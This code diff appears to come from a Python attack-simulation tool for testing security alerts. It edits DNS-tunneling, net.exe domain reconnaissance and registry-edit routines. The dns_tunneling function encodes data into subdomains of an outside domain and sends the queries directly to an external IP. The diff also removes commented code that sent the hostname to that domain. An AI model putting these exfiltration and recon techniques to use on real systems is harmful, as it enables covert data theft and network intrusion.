@@ -382,7 +382,7 @@ def ransomware_simulation():
         logging_func("ransomware simulation error")
         return {"use_case": "ransomware_simulation", "status": f"error: {e}"}
 
-# Only works when doing calls to external url
+# Only works both ways when doing calls to external url, but should still trigger outbound dns-tunnel alerts
 def dns_tunneling():
     logging_func("DNS tunneling simulation starting")
     try:
@@ -390,6 +390,8 @@ def dns_tunneling():
         text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))
         text_str = text_bytes.decode("ascii")   
         qname = f"{text_str}.dns.bitlus.online"
+        # Have to point the DNS request directly to our server, 
+        # Should work if our DNS server was a Authoritative one 
         dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
         answer = sr1(dns_req, verbose=1, timeout=5)
         if answer:
@@ -407,35 +409,6 @@ def dns_tunneling():
         logging_func("DNS Tunneling Error")
         return {"use_case": "dns_tunneling", "status": f"error{e}"}
     
-
-    # DNS_TUNNEL_API = f"{base_url}/api/dnstunneling"
-    # try:
-    #     print("Executing DNS Tunneling Use-Case")
-    #     # Example data to send
-    #     data_to_send = f"{socket.gethostname()}-test-data"     
-    #     # Encode data to Base64 (URL-safe)
-    #     encoded_data = base64.urlsafe_b64encode(data_to_send.encode('utf-8')).decode('utf-8')
-    #     print(f"Encoded Data (Base64): {encoded_data}")
-    #     # Simulate a DNS query by sending the encoded data as a subdomain
-    #     headers = {
-    #         "Host": f"{encoded_data}.bitlus.online",  # Format as subdomain
-    #     }
-    #     # Send the request to the API
-    #     response = requests.get(DNS_TUNNEL_API, headers=headers)
-    #     # Handle the API response
-    #     if response.status_code == 200:
-    #         response_data = response.json()
-    #         print(f"DNS Tunneling successful: {response_data['decoded_data']}")
-    #         logging_func("DNS Tunneling successful")
-    #         return {"use_case": "dns_tunneling", "status": f"completed: {response_data['decoded_data']}"}
-    #     else:
-    #         print(f"DNS Tunneling failed: {response.json().get('message')}")
-    #         logging_func("DNS Tunneling failed")
-    #         return {"use_case": "dns_tunneling", "status": "failed", "error": response.json().get('message')}
-    # except Exception as e:
-    #     print(f"Error in DNS Tunneling: {e}")
-    #     logging_func("DNS Tunneling Error")
-    #     return {"use_case": "dns_tunneling", "status": f"error{e}"}
  
 def net_recon():
     CMD = ['group', 'user', 'localgroup', 'user /domain']
@@ -458,10 +431,12 @@ def net_recon():
     logging_func("NET.exe recon simulation finished")
     return {"use_case": "net_recon", "status": "completed"}
 
+# Not finished
 def dll_side_loading():
     logging_func("DLL side loading simulation.")
     return {"use_case": "dll_side_loading", "status": "completed"}
 
+# Makes registry edit simulation, only makes a empty test value, and also enumerates 10 times in the CurrentVersion folder
 def registry_edits():
     print("Registry edit simulation starting")
     logging_func("Registry edits loading simulation starting")
